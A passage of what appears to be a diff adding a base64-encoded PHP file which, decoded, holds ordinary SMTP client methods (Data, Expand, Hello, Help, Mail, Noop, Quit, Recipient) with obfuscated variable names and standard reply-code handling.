+eDNmKTsKCQkkeDQwID0gZXhwbG9kZSgiXG4iLCR4M2YpOwoKCQkjIHdlIG5lZWQgdG8gZmluZCBh
+IGdvb2Qgd2F5IHRvIGRldGVybWluZSBpcyBoZWFkZXJzIGFyZQoJCSMgaW4gdGhlIG1zZ19kYXRh
+IG9yIGlmIGl0IGlzIGEgc3RyYWlnaHQgbXNnIGJvZHkKCQkjIGN1cnJlbnRseSBJIGFtIGFzc3Vt
+aW5nIHJmYyA4MjIgZGVmaW5pdGlvbnMgb2YgbXNnIGhlYWRlcnMKCQkjIGFuZCBpZiB0aGUgZmly
+c3QgZmllbGQgb2YgdGhlIGZpcnN0IGxpbmUgKCc6JyBzcGVyYXRlZCkKCQkjIGRvZXMgbm90IGNv
+bnRhaW4gYSBzcGFjZSB0aGVuIGl0IF9zaG91bGRfIGJlIGEgaGVhZGVyCgkJIyBhbmQgd2UgY2Fu
+IHByb2Nlc3MgYWxsIGxpbmVzIGJlZm9yZSBhIGJsYW5rICIiIGxpbmUgYXMKCQkjIGhlYWRlcnMu
+CgkJJHg0MSA9IHN1YnN0cigkeDQwWzBdLDAsc3RycG9zKCR4NDBbMF0sIjoiKSk7CgkJJHg0MiA9
+IGZhbHNlOwoJCWlmKCFlbXB0eSgkeDQxKSAmJiAhc3Ryc3RyKCR4NDEsIiAiKSkgewoJCSAgJHg0
+MiA9IHRydWU7CgkJfQoKCQkkeDQzID0gOTk4OyAjIHVzZWQgYmVsb3c7IHNldCBoZXJlIGZvciBl
+YXNlIGluIGNoYW5nZQoKCQl3aGlsZShsaXN0KCwkeDQ0KSA9IEBlYWNoKCR4NDApKSB7CgkJICAk
+eDQ1ID0gbnVsbDsKCQkgIGlmKCR4NDQgPT0gIiIgJiYgJHg0MikgewoJCQkkeDQyID0gZmFsc2U7
+CgkJICB9CgkJICAjIG9rIHdlIG5lZWQgdG8gYnJlYWsgdGhpcyBsaW5lIHVwIGludG8gc2V2ZXJh
+bAoJCSAgIyBzbWFsbGVyIGxpbmVzCgkJICB3aGlsZShzdHJsZW4oJHg0NCkgPiAkeDQzKSB7CgkJ
+CSR4NDYgPSBzdHJycG9zKHN1YnN0cigkeDQ0LDAsJHg0MyksIiAiKTsKCgkJCSMgUGF0Y2ggdG8g
+Zml4IERPUyBhdHRhY2sKCQkJaWYoISR4NDYpIHsKCQkJICAkeDQ2ID0gJHg0MyAtIDE7CgkJCX0K
+CgkJCSR4NDVbXSA9IHN1YnN0cigkeDQ0LDAsJHg0Nik7CgkJCSR4NDQgPSBzdWJzdHIoJHg0NCwk
+eDQ2ICsgMSk7CgkJCSMgaWYgd2UgYXJlIHByb2Nlc3NpbmcgaGVhZGVycyB3ZSBuZWVkIHRvCgkJ
+CSMgYWRkIGEgTFdTUC1jaGFyIHRvIHRoZSBmcm9udCBvZiB0aGUgbmV3IGxpbmUKCQkJIyByZmMg
+ODIyIG9uIGxvbmcgbXNnIGhlYWRlcnMKCQkJaWYoJHg0MikgewoJCQkgICR4NDQgPSAiXHQiIC4g
+JHg0NDsKCQkJfQoJCSAgfQoJCSAgJHg0NVtdID0gJHg0NDsKCgkJICAjIG5vdyBzZW5kIHRoZSBs
+aW5lcyB0byB0aGUgc2VydmVyCgkJICB3aGlsZShsaXN0KCwkeDQ3KSA9IEBlYWNoKCR4NDUpKSB7
+CgkJCWlmKHN0cmxlbigkeDQ3KSA+IDApCgkJCXsKCQkJICBpZihzdWJzdHIoJHg0NywgMCwgMSkg
+PT0gIi4iKSB7CgkJCQkkeDQ3ID0gIi4iIC4gJHg0NzsKCQkJICB9CgkJCX0KCQkJZnB1dHMoJHRo
+aXMtPnNtdHBfY29ubiwkeDQ3IC4gJHRoaXMtPkNSTEYpOwoJCSAgfQoJCX0KCgkJIyBvayBhbGwg
+dGhlIG1lc3NhZ2UgZGF0YSBoYXMgYmVlbiBzZW50IHNvIGxldHMgZ2V0IHRoaXMKCQkjIG92ZXIg
+d2l0aCBhbGVhZHkKCQlmcHV0cygkdGhpcy0+c210cF9jb25uLCAkdGhpcy0+Q1JMRiAuICIuIiAu
+ICR0aGlzLT5DUkxGKTsKCgkJJHgzYyA9ICR0aGlzLT5nZXRfbGluZXMoKTsKCQkkeDNkID0gc3Vi
+c3RyKCR4M2MsMCwzKTsKCgkJaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKCQkgIGVjaG8gIlNN
+VFAgLT4gRlJPTSBTRVJWRVI6IiAuICR0aGlzLT5DUkxGIC4gJHgzYzsKCQl9CgoJCWlmKCR4M2Qg
+IT0gMjUwKSB7CgkJICAkdGhpcy0+ZXJyb3IgPQoJCQlhcnJheSgiZXJyb3IiID0+ICJEQVRBIG5v
+dCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCgkJCQkgICJzbXRwX2NvZGUiID0+ICR4M2QsCgkJCQkg
+ICJzbXRwX21zZyIgPT4gc3Vic3RyKCR4M2MsNCkpOwoJCSAgaWYoJHRoaXMtPmRvX2RlYnVnID49
+IDEpIHsKCQkJZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAu
+CgkJCQkJICI6ICIgLiAkeDNjIC4gJHRoaXMtPkNSTEY7CgkJICB9CgkJICByZXR1cm4gZmFsc2U7
+CgkJfQoJCXJldHVybiB0cnVlOwoJICB9CgoJICAvKioKCSAgICogRXhwYW5kIHRha2VzIHRoZSBu
+YW1lIGFuZCBhc2tzIHRoZSBzZXJ2ZXIgdG8gbGlzdCBhbGwgdGhlCgkgICAqIHBlb3BsZSB3aG8g
+YXJlIG1lbWJlcnMgb2YgdGhlIF9saXN0Xy4gRXhwYW5kIHdpbGwgcmV0dXJuCgkgICAqIGJhY2sg
+YW5kIGFycmF5IG9mIHRoZSByZXN1bHQgb3IgZmFsc2UgaWYgYW4gZXJyb3Igb2NjdXJzLgoJICAg
+KiBFYWNoIHZhbHVlIGluIHRoZSBhcnJheSByZXR1cm5lZCBoYXMgdGhlIGZvcm1hdCBvZjoKCSAg
+ICogICAgIFsgPGZ1bGwtbmFtZT4gPHNwPiBdIDxwYXRoPgoJICAgKiBUaGUgZGVmaW5pdGlvbiBv
+ZiA8cGF0aD4gaXMgZGVmaW5lZCBpbiByZmMgODIxCgkgICAqCgkgICAqIEltcGxlbWVudHMgcmZj
+IDgyMTogRVhQTiA8U1A+IDxzdHJpbmc+IDxDUkxGPgoJICAgKgoJICAgKiBTTVRQIENPREUgU1VD
+Q0VTUzogMjUwCgkgICAqIFNNVFAgQ09ERSBGQUlMVVJFOiA1NTAKCSAgICogU01UUCBDT0RFIEVS
+Uk9SICA6IDUwMCw1MDEsNTAyLDUwNCw0MjEKCSAgICogQGFjY2VzcyBwdWJsaWMKCSAgICogQHJl
+dHVybiBzdHJpbmcgYXJyYXkKCSAgICovCgkgIGZ1bmN0aW9uIEV4cGFuZCgkeDQ4KSB7CgkJJHRo
+aXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2VkCgoJCWlmKCEkdGhp
+cy0+Y29ubmVjdGVkKCkpIHsKCQkgICR0aGlzLT5lcnJvciA9IGFycmF5KAoJCQkJImVycm9yIiA9
+PiAiQ2FsbGVkIEV4cGFuZCgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CgkJICByZXR1cm4g
+ZmFsc2U7CgkJfQoKCQlmcHV0cygkdGhpcy0+c210cF9jb25uLCJFWFBOICIgLiAkeDQ4IC4gJHRo
+aXMtPkNSTEYpOwoKCQkkeDNjID0gJHRoaXMtPmdldF9saW5lcygpOwoJCSR4M2QgPSBzdWJzdHIo
+JHgzYywwLDMpOwoKCQlpZigkdGhpcy0+ZG9fZGVidWcgPj0gMikgewoJCSAgZWNobyAiU01UUCAt
+PiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMtPkNSTEYgLiAkeDNjOwoJCX0KCgkJaWYoJHgzZCAhPSAy
+NTApIHsKCQkgICR0aGlzLT5lcnJvciA9CgkJCWFycmF5KCJlcnJvciIgPT4gIkVYUE4gbm90IGFj
+Y2VwdGVkIGZyb20gc2VydmVyIiwKCQkJCSAgInNtdHBfY29kZSIgPT4gJHgzZCwKCQkJCSAgInNt
+dHBfbXNnIiA9PiBzdWJzdHIoJHgzYyw0KSk7CgkJICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkg
+ewoJCQllY2hvICJTTVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4KCQkJ
+CQkgIjogIiAuICR4M2MgLiAkdGhpcy0+Q1JMRjsKCQkgIH0KCQkgIHJldHVybiBmYWxzZTsKCQl9
+CgoJCSMgcGFyc2UgdGhlIHJlcGx5IGFuZCBwbGFjZSBpbiBvdXIgYXJyYXkgdG8gcmV0dXJuIHRv
+IHVzZXIKCQkkeDQ5ID0gZXhwbG9kZSgkdGhpcy0+Q1JMRiwkeDNjKTsKCQl3aGlsZShsaXN0KCwk
+eDRhKSA9IEBlYWNoKCR4NDkpKSB7CgkJICAkeDRiW10gPSBzdWJzdHIoJHg0YSw0KTsKCQl9CgoJ
+CXJldHVybiAkeDRiOwoJICB9CgoJICAvKioKCSAgICogU2VuZHMgdGhlIEhFTE8gY29tbWFuZCB0
+byB0aGUgc210cCBzZXJ2ZXIuCgkgICAqIFRoaXMgbWFrZXMgc3VyZSB0aGF0IHdlIGFuZCB0aGUg
+c2VydmVyIGFyZSBpbgoJICAgKiB0aGUgc2FtZSBrbm93biBzdGF0ZS4KCSAgICoKCSAgICogSW1w
+bGVtZW50cyBmcm9tIHJmYyA4MjE6IEhFTE8gPFNQPiA8ZG9tYWluPiA8Q1JMRj4KCSAgICoKCSAg
+ICogU01UUCBDT0RFIFNVQ0NFU1M6IDI1MAoJICAgKiBTTVRQIENPREUgRVJST1IgIDogNTAwLCA1
+MDEsIDUwNCwgNDIxCgkgICAqIEBhY2Nlc3MgcHVibGljCgkgICAqIEByZXR1cm4gYm9vbAoJICAg
+Ki8KCSAgZnVuY3Rpb24gSGVsbG8oJHgzND0iIikgewoJCSR0aGlzLT5lcnJvciA9IG51bGw7ICMg
+c28gbm8gY29uZnVzaW9uIGlzIGNhdXNlZAoKCQlpZighJHRoaXMtPmNvbm5lY3RlZCgpKSB7CgkJ
+ICAkdGhpcy0+ZXJyb3IgPSBhcnJheSgKCQkJCSJlcnJvciIgPT4gIkNhbGxlZCBIZWxsbygpIHdp
+dGhvdXQgYmVpbmcgY29ubmVjdGVkIik7CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQkjIGlmIGEg
+aG9zdG5hbWUgZm9yIHRoZSBIRUxPIHdhcyBub3Qgc3BlY2lmaWVkIGRldGVybWluZQoJCSMgYSBz
+dWl0YWJsZSBvbmUgdG8gc2VuZAoJCWlmKGVtcHR5KCR4MzQpKSB7CgkJICAjIHdlIG5lZWQgdG8g
+ZGV0ZXJtaW5lIHNvbWUgc29ydCBvZiBhcHBvcGlhdGUgZGVmYXVsdAoJCSAgIyB0byBzZW5kIHRv
+IHRoZSBzZXJ2ZXIKCQkgICR4MzQgPSAibG9jYWxob3N0IjsKCQl9CgoJCS8vIFNlbmQgZXh0ZW5k
+ZWQgaGVsbG8gZmlyc3QgKFJGQyAyODIxKQoJCWlmKCEkdGhpcy0+U2VuZEhlbGxvKCJFSExPIiwg
+JHgzNCkpCgkJewoJCSAgaWYoISR0aGlzLT5TZW5kSGVsbG8oIkhFTE8iLCAkeDM0KSkKCQkJICBy
+ZXR1cm4gZmFsc2U7CgkJfQoKCQlyZXR1cm4gdHJ1ZTsKCSAgfQoKCSAgLyoqCgkgICAqIFNlbmRz
+IGEgSEVMTy9FSExPIGNvbW1hbmQuCgkgICAqIEBhY2Nlc3MgcHJpdmF0ZQoJICAgKiBAcmV0dXJu
+IGJvb2wKCSAgICovCgkgIGZ1bmN0aW9uIFNlbmRIZWxsbygkeDRjLCAkeDM0KSB7CgkJZnB1dHMo
+JHRoaXMtPnNtdHBfY29ubiwgJHg0YyAuICIgIiAuICR4MzQgLiAkdGhpcy0+Q1JMRik7CgoJCSR4
+M2MgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgkJJHgzZCA9IHN1YnN0cigkeDNjLDAsMyk7CgoJCWlm
+KCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CgkJICBlY2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiAi
+IC4gJHRoaXMtPkNSTEYgLiAkeDNjOwoJCX0KCgkJaWYoJHgzZCAhPSAyNTApIHsKCQkgICR0aGlz
+LT5lcnJvciA9CgkJCWFycmF5KCJlcnJvciIgPT4gJHg0YyAuICIgbm90IGFjY2VwdGVkIGZyb20g
+c2VydmVyIiwKCQkJCSAgInNtdHBfY29kZSIgPT4gJHgzZCwKCQkJCSAgInNtdHBfbXNnIiA9PiBz
+dWJzdHIoJHgzYyw0KSk7CgkJICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewoJCQllY2hvICJT
+TVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4KCQkJCQkgIjogIiAuICR4
+M2MgLiAkdGhpcy0+Q1JMRjsKCQkgIH0KCQkgIHJldHVybiBmYWxzZTsKCQl9CgoJCSR0aGlzLT5o
+ZWxvX3JwbHkgPSAkeDNjOwoKCQlyZXR1cm4gdHJ1ZTsKCSAgfQoKCSAgLyoqCgkgICAqIEdldHMg
+aGVscCBpbmZvcm1hdGlvbiBvbiB0aGUga2V5d29yZCBzcGVjaWZpZWQuIElmIHRoZSBrZXl3b3Jk
+CgkgICAqIGlzIG5vdCBzcGVjaWZpZWQgdGhlbiByZXR1cm5zIGdlbmVyaWMgaGVscCwgdXNzdWFs
+bHkgY29udGlhbmluZwoJICAgKiBBIGxpc3Qgb2Yga2V5d29yZHMgdGhhdCBoZWxwIGlzIGF2YWls
+YWJsZSBvbi4gVGhpcyBmdW5jdGlvbgoJICAgKiByZXR1cm5zIHRoZSByZXN1bHRzIGJhY2sgdG8g
+dGhlIHVzZXIuIEl0IGlzIHVwIHRvIHRoZSB1c2VyIHRvCgkgICAqIGhhbmRsZSB0aGUgcmV0dXJu
+ZWQgZGF0YS4gSWYgYW4gZXJyb3Igb2NjdXJzIHRoZW4gZmFsc2UgaXMKCSAgICogcmV0dXJuZWQg
+d2l0aCAkdGhpcy0+ZXJyb3Igc2V0IGFwcHJvcGlhdGVseS4KCSAgICoKCSAgICogSW1wbGVtZW50
+cyByZmMgODIxOiBIRUxQIFsgPFNQPiA8c3RyaW5nPiBdIDxDUkxGPgoJICAgKgoJICAgKiBTTVRQ
+IENPREUgU1VDQ0VTUzogMjExLDIxNAoJICAgKiBTTVRQIENPREUgRVJST1IgIDogNTAwLDUwMSw1
+MDIsNTA0LDQyMQoJICAgKiBAYWNjZXNzIHB1YmxpYwoJICAgKiBAcmV0dXJuIHN0cmluZwoJICAg
+Ki8KCSAgZnVuY3Rpb24gSGVscCgkeDRkPSIiKSB7CgkJJHRoaXMtPmVycm9yID0gbnVsbDsgIyB0
+byBhdm9pZCBjb25mdXNpb24KCgkJaWYoISR0aGlzLT5jb25uZWN0ZWQoKSkgewoJCSAgJHRoaXMt
+PmVycm9yID0gYXJyYXkoCgkJCQkgICJlcnJvciIgPT4gIkNhbGxlZCBIZWxwKCkgd2l0aG91dCBi
+ZWluZyBjb25uZWN0ZWQiKTsKCQkgIHJldHVybiBmYWxzZTsKCQl9CgoJCSR4NGUgPSAiIjsKCQlp
+ZighZW1wdHkoJHg0ZCkpIHsKCQkgICR4NGUgPSAiICIgLiAkeDRkOwoJCX0KCgkJZnB1dHMoJHRo
+aXMtPnNtdHBfY29ubiwiSEVMUCIgLiAkeDRlIC4gJHRoaXMtPkNSTEYpOwoKCQkkeDNjID0gJHRo
+aXMtPmdldF9saW5lcygpOwoJCSR4M2QgPSBzdWJzdHIoJHgzYywwLDMpOwoKCQlpZigkdGhpcy0+
+ZG9fZGVidWcgPj0gMikgewoJCSAgZWNobyAiU01UUCAtPiBGUk9NIFNFUlZFUjoiIC4gJHRoaXMt
+PkNSTEYgLiAkeDNjOwoJCX0KCgkJaWYoJHgzZCAhPSAyMTEgJiYgJHgzZCAhPSAyMTQpIHsKCQkg
+ICR0aGlzLT5lcnJvciA9CgkJCWFycmF5KCJlcnJvciIgPT4gIkhFTFAgbm90IGFjY2VwdGVkIGZy
+b20gc2VydmVyIiwKCQkJCSAgInNtdHBfY29kZSIgPT4gJHgzZCwKCQkJCSAgInNtdHBfbXNnIiA9
+PiBzdWJzdHIoJHgzYyw0KSk7CgkJICBpZigkdGhpcy0+ZG9fZGVidWcgPj0gMSkgewoJCQllY2hv
+ICJTTVRQIC0+IEVSUk9SOiAiIC4gJHRoaXMtPmVycm9yWyJlcnJvciJdIC4KCQkJCQkgIjogIiAu
+ICR4M2MgLiAkdGhpcy0+Q1JMRjsKCQkgIH0KCQkgIHJldHVybiBmYWxzZTsKCQl9CgoJCXJldHVy
+biAkeDNjOwoJICB9CgoJICAvKioKCSAgICogU3RhcnRzIGEgbWFpbCB0cmFuc2FjdGlvbiBmcm9t
+IHRoZSBlbWFpbCBhZGRyZXNzIHNwZWNpZmllZCBpbgoJICAgKiAkeDFiLiBSZXR1cm5zIHRydWUg
+aWYgc3VjY2Vzc2Z1bCBvciBmYWxzZSBvdGhlcndpc2UuIElmIFRydWUKCSAgICogdGhlIG1haWwg
+dHJhbnNhY3Rpb24gaXMgc3RhcnRlZCBhbmQgdGhlbiBvbmUgb3IgbW9yZSBSZWNpcGllbnQKCSAg
+ICogY29tbWFuZHMgbWF5IGJlIGNhbGxlZCBmb2xsb3dlZCBieSBhIERhdGEgY29tbWFuZC4KCSAg
+ICoKCSAgICogSW1wbGVtZW50cyByZmMgODIxOiBNQUlMIDxTUD4gRlJPTTo8cmV2ZXJzZS1wYXRo
+PiA8Q1JMRj4KCSAgICoKCSAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDI1MAoJICAgKiBTTVRQIENP
+REUgU1VDQ0VTUzogNTUyLDQ1MSw0NTIKCSAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDUwMCw1MDEs
+NDIxCgkgICAqIEBhY2Nlc3MgcHVibGljCgkgICAqIEByZXR1cm4gYm9vbAoJICAgKi8KCSAgZnVu
+Y3Rpb24gTWFpbCgkeDFiKSB7CgkJJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNp
+b24gaXMgY2F1c2VkCgoJCWlmKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsKCQkgICR0aGlzLT5lcnJv
+ciA9IGFycmF5KAoJCQkJICAiZXJyb3IiID0+ICJDYWxsZWQgTWFpbCgpIHdpdGhvdXQgYmVpbmcg
+Y29ubmVjdGVkIik7CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQkkeDRmID0gKCR0aGlzLT5kb192
+ZXJwID8gIlhWRVJQIiA6ICIiKTsKCQlmcHV0cygkdGhpcy0+c210cF9jb25uLCJNQUlMIEZST006
+PCIgLiAkeDFiIC4gIj4iIC4gJHg0ZiAuICR0aGlzLT5DUkxGKTsKCgkJJHgzYyA9ICR0aGlzLT5n
+ZXRfbGluZXMoKTsKCQkkeDNkID0gc3Vic3RyKCR4M2MsMCwzKTsKCgkJaWYoJHRoaXMtPmRvX2Rl
+YnVnID49IDIpIHsKCQkgIGVjaG8gIlNNVFAgLT4gRlJPTSBTRVJWRVI6IiAuICR0aGlzLT5DUkxG
+IC4gJHgzYzsKCQl9CgoJCWlmKCR4M2QgIT0gMjUwKSB7CgkJICAkdGhpcy0+ZXJyb3IgPQoJCQlh
+cnJheSgiZXJyb3IiID0+ICJNQUlMIG5vdCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCgkJCQkgICJz
+bXRwX2NvZGUiID0+ICR4M2QsCgkJCQkgICJzbXRwX21zZyIgPT4gc3Vic3RyKCR4M2MsNCkpOwoJ
+CSAgaWYoJHRoaXMtPmRvX2RlYnVnID49IDEpIHsKCQkJZWNobyAiU01UUCAtPiBFUlJPUjogIiAu
+ICR0aGlzLT5lcnJvclsiZXJyb3IiXSAuCgkJCQkJICI6ICIgLiAkeDNjIC4gJHRoaXMtPkNSTEY7
+CgkJICB9CgkJICByZXR1cm4gZmFsc2U7CgkJfQoJCXJldHVybiB0cnVlOwoJICB9CgoJICAvKioK
+CSAgICogU2VuZHMgdGhlIGNvbW1hbmQgTk9PUCB0byB0aGUgU01UUCBzZXJ2ZXIuCgkgICAqCgkg
+ICAqIEltcGxlbWVudHMgZnJvbSByZmMgODIxOiBOT09QIDxDUkxGPgoJICAgKgoJICAgKiBTTVRQ
+IENPREUgU1VDQ0VTUzogMjUwCgkgICAqIFNNVFAgQ09ERSBFUlJPUiAgOiA1MDAsIDQyMQoJICAg
+KiBAYWNjZXNzIHB1YmxpYwoJICAgKiBAcmV0dXJuIGJvb2wKCSAgICovCgkgIGZ1bmN0aW9uIE5v
+b3AoKSB7CgkJJHRoaXMtPmVycm9yID0gbnVsbDsgIyBzbyBubyBjb25mdXNpb24gaXMgY2F1c2Vk
+CgoJCWlmKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsKCQkgICR0aGlzLT5lcnJvciA9IGFycmF5KAoJ
+CQkJICAiZXJyb3IiID0+ICJDYWxsZWQgTm9vcCgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7
+CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQlmcHV0cygkdGhpcy0+c210cF9jb25uLCJOT09QIiAu
+ICR0aGlzLT5DUkxGKTsKCgkJJHgzYyA9ICR0aGlzLT5nZXRfbGluZXMoKTsKCQkkeDNkID0gc3Vi
+c3RyKCR4M2MsMCwzKTsKCgkJaWYoJHRoaXMtPmRvX2RlYnVnID49IDIpIHsKCQkgIGVjaG8gIlNN
+VFAgLT4gRlJPTSBTRVJWRVI6IiAuICR0aGlzLT5DUkxGIC4gJHgzYzsKCQl9CgoJCWlmKCR4M2Qg
+IT0gMjUwKSB7CgkJICAkdGhpcy0+ZXJyb3IgPQoJCQlhcnJheSgiZXJyb3IiID0+ICJOT09QIG5v
+dCBhY2NlcHRlZCBmcm9tIHNlcnZlciIsCgkJCQkgICJzbXRwX2NvZGUiID0+ICR4M2QsCgkJCQkg
+ICJzbXRwX21zZyIgPT4gc3Vic3RyKCR4M2MsNCkpOwoJCSAgaWYoJHRoaXMtPmRvX2RlYnVnID49
+IDEpIHsKCQkJZWNobyAiU01UUCAtPiBFUlJPUjogIiAuICR0aGlzLT5lcnJvclsiZXJyb3IiXSAu
+CgkJCQkJICI6ICIgLiAkeDNjIC4gJHRoaXMtPkNSTEY7CgkJICB9CgkJICByZXR1cm4gZmFsc2U7
+CgkJfQoJCXJldHVybiB0cnVlOwoJICB9CgoJICAvKioKCSAgICogU2VuZHMgdGhlIHF1aXQgY29t
+bWFuZCB0byB0aGUgc2VydmVyIGFuZCB0aGVuIGNsb3NlcyB0aGUgc29ja2V0CgkgICAqIGlmIHRo
+ZXJlIGlzIG5vIGVycm9yIG9yIHRoZSAkeDUwIGFyZ3VtZW50IGlzIHRydWUuCgkgICAqCgkgICAq
+IEltcGxlbWVudHMgZnJvbSByZmMgODIxOiBRVUlUIDxDUkxGPgoJICAgKgoJICAgKiBTTVRQIENP
+REUgU1VDQ0VTUzogMjIxCgkgICAqIFNNVFAgQ09ERSBFUlJPUiAgOiA1MDAKCSAgICogQGFjY2Vz
+cyBwdWJsaWMKCSAgICogQHJldHVybiBib29sCgkgICAqLwoJICBmdW5jdGlvbiBRdWl0KCR4NTA9
+dHJ1ZSkgewoJCSR0aGlzLT5lcnJvciA9IG51bGw7ICMgc28gdGhlcmUgaXMgbm8gY29uZnVzaW9u
+CgoJCWlmKCEkdGhpcy0+Y29ubmVjdGVkKCkpIHsKCQkgICR0aGlzLT5lcnJvciA9IGFycmF5KAoJ
+CQkJICAiZXJyb3IiID0+ICJDYWxsZWQgUXVpdCgpIHdpdGhvdXQgYmVpbmcgY29ubmVjdGVkIik7
+CgkJICByZXR1cm4gZmFsc2U7CgkJfQoKCQkjIHNlbmQgdGhlIHF1aXQgY29tbWFuZCB0byB0aGUg
+c2VydmVyCgkJZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwicXVpdCIgLiAkdGhpcy0+Q1JMRik7CgoJ
+CSMgZ2V0IGFueSBnb29kLWJ5ZSBtZXNzYWdlcwoJCSR4NTEgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7
+CgoJCWlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CgkJICBlY2hvICJTTVRQIC0+IEZST00gU0VS
+VkVSOiIgLiAkdGhpcy0+Q1JMRiAuICR4NTE7CgkJfQoKCQkkeDUyID0gdHJ1ZTsKCQkkeDUzID0g
+bnVsbDsKCgkJJHgzZCA9IHN1YnN0cigkeDUxLDAsMyk7CgkJaWYoJHgzZCAhPSAyMjEpIHsKCQkg
+ICMgdXNlIGUgYXMgYSB0bXAgdmFyIGNhdXNlIENsb3NlIHdpbGwgb3ZlcndyaXRlICR0aGlzLT5l
+cnJvcgoJCSAgJHg1MyA9IGFycmF5KCJlcnJvciIgPT4gIlNNVFAgc2VydmVyIHJlamVjdGVkIHF1
+aXQgY29tbWFuZCIsCgkJCQkJICJzbXRwX2NvZGUiID0+ICR4M2QsCgkJCQkJICJzbXRwX3JwbHki
+ID0+IHN1YnN0cigkeDUxLDQpKTsKCQkgICR4NTIgPSBmYWxzZTsKCQkgIGlmKCR0aGlzLT5kb19k
+ZWJ1ZyA+PSAxKSB7CgkJCWVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAkeDUzWyJlcnJvciJdIC4g
+IjogIiAuCgkJCQkJICR4NTEgLiAkdGhpcy0+Q1JMRjsKCQkgIH0KCQl9CgoJCWlmKGVtcHR5KCR4
+NTMpIHx8ICR4NTApIHsKCQkgICR0aGlzLT5DbG9zZSgpOwoJCX0KCgkJcmV0dXJuICR4NTI7Cgkg
+IH0KCgkgIC8qKgoJICAgKiBTZW5kcyB0aGUgY29tbWFuZCBSQ1BUIHRvIHRoZSBTTVRQIHNlcnZl
+ciB3aXRoIHRoZSBUTzogYXJndW1lbnQgb2YgJHg1NC4KCSAgICogUmV0dXJucyB0cnVlIGlmIHRo
+ZSByZWNpcGllbnQgd2FzIGFjY2VwdGVkIGZhbHNlIGlmIGl0IHdhcyByZWplY3RlZC4KCSAgICoK
+CSAgICogSW1wbGVtZW50cyBmcm9tIHJmYyA4MjE6IFJDUFQgPFNQPiBUTzo8Zm9yd2FyZC1wYXRo
+PiA8Q1JMRj4KCSAgICoKCSAgICogU01UUCBDT0RFIFNVQ0NFU1M6IDI1MCwyNTEKCSAgICogU01U
+UCBDT0RFIEZBSUxVUkU6IDU1MCw1NTEsNTUyLDU1Myw0NTAsNDUxLDQ1MgoJICAgKiBTTVRQIENP
+REUgRVJST1IgIDogNTAwLDUwMSw1MDMsNDIxCgkgICAqIEBhY2Nlc3MgcHVibGljCgkgICAqIEBy
+ZXR1cm4gYm9vbAoJICAgKi8KCSAgZnVuY3Rpb24gUmVjaXBpZW50KCR4NTQpIHsKCQkkdGhpcy0+
+ZXJyb3IgPSBudWxsOyAjIHNvIG5vIGNvbmZ1c2lvbiBpcyBjYXVzZWQKCgkJaWYoISR0aGlzLT5j
+b25uZWN0ZWQoKSkgewoJCSAgJHRoaXMtPmVycm9yID0gYXJyYXkoCgkJCQkgICJlcnJvciIgPT4g
+IkNhbGxlZCBSZWNpcGllbnQoKSB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOwoJCSAgcmV0dXJu
+IGZhbHNlOwoJCX0KCgkJZnB1dHMoJHRoaXMtPnNtdHBfY29ubiwiUkNQVCBUTzo8IiAuICR4NTQg
+LiAiPiIgLiAkdGhpcy0+Q1JMRik7CgoJCSR4M2MgPSAkdGhpcy0+Z2V0X2xpbmVzKCk7CgkJJHgz
+ZCA9IHN1YnN0cigkeDNjLDAsMyk7CgoJCWlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAyKSB7CgkJICBl
+Y2hvICJTTVRQIC0+IEZST00gU0VSVkVSOiIgLiAkdGhpcy0+Q1JMRiAuICR4M2M7CgkJfQoKCQlp
+ZigkeDNkICE9IDI1MCAmJiAkeDNkICE9IDI1MSkgewoJCSAgJHRoaXMtPmVycm9yID0KCQkJYXJy
+YXkoImVycm9yIiA9PiAiUkNQVCBub3QgYWNjZXB0ZWQgZnJvbSBzZXJ2ZXIiLAoJCQkJICAic210
+cF9jb2RlIiA9PiAkeDNkLAoJCQkJICAic210cF9tc2ciID0+IHN1YnN0cigkeDNjLDQpKTsKCQkg
+IGlmKCR0aGlzLT5kb19kZWJ1ZyA+PSAxKSB7CgkJCWVjaG8gIlNNVFAgLT4gRVJST1I6ICIgLiAk
+dGhpcy0+ZXJyb3JbImVycm9yIl0gLgoJCQkJCSAiOiAiIC4gJHgzYyAuICR0aGlzLT5DUkxGOwoJ
+CSAgfQoJCSAgcmV0dXJuIGZhbHNlOwoJCX0KCQlyZXR1cm4gdHJ1ZTsKCSAgfQoKCSAgLyoqCgkg
+ICAqIFNlbmRzIHRoZSBSU0VUIGNvbW1hbmQgdG8gYWJvcnQgYW5kIHRyYW5zYWN0aW9uIHRoYXQg
+aXMKCSAgICogY3VycmVudGx5IGluIHByb2dyZXNzLiBSZXR1cm5zIHRydWUgaWYgc3VjY2Vzc2Z1
+bCBmYWxzZQoJICAgKiBvdGhlcndpc2UuCgkgICAqCgkgICAqIEltcGxlbWVudHMgcmZjIDgyMTog
